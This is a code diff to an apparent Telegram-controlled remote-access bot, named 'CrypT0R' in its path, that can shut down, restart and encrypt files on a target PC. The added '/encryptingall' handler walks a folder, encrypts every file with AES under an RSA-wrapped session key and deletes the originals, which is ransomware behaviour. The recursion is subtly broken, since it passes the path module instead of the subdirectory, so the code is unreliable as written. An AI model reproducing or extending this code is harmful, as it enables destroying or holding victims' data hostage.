@@ -38,8 +38,10 @@ Bot Commands:
 [ /] /start
 [02] Help.
 [ /] /help
-[03] Encrypting data.
-[ /] /encrypting
+[03] Encrypting one file.
+[ /] /encryptingone
+[03] Encrypting all data.
+[ /] /encryptingall
 [04] Shutdown PC.
 [ /] /shutdown
 [05] Restart PC.
@@ -83,6 +85,42 @@ def encrypt(self):
     except Exception as ex:  # Бот отправит нам сообщение с ошибкой / Bot will send us message with exception
         bot.send_message(chat_id, "Something went wrong!\n" + str(ex))
 
+        
+# Initiate command /encrypt
+@bot.message_handler(commands=["encryptingall", "/encryptingall"])
+def encrypt(self):
+        def crypt(file):
+            f = open(file, "rb")
+            data = f.read()
+            f.close()
+
+            file_out = open(str(file) + ".bin", "wb")
+
+            recipient_key = RSA.import_key(open('receiver.pem').read())
+            session_key = get_random_bytes(16)
+
+            cipher_rsa = PKCS1_OAEP.new(recipient_key)
+            enc_session_key = cipher_rsa.encrypt(session_key)
+
+            cipher_aes = AES.new(session_key, AES.MODE_EAX)
+            ciphertext, tag = cipher_aes.encrypt_and_digest(data)
+
+            [file_out.write(x) for x in (enc_session_key, cipher_aes.nonce, tag, ciphertext)]
+
+            print(file + " Encoded")
+            remove(file)
+
+        def walk(dir):
+            for name in listdir(dir):
+                path_to_file = path.join(dir, name)
+                if path.isfile(path_to_file):
+                    crypt(path_to_file)
+                else:
+                    walk(path)
+
+        walk("C:/Users/User/Desktop/Python_Projects/CrypT0R/aa/")
+        
+        
 # -----------------------------------------------------------------------------------------------------------------------
 
 
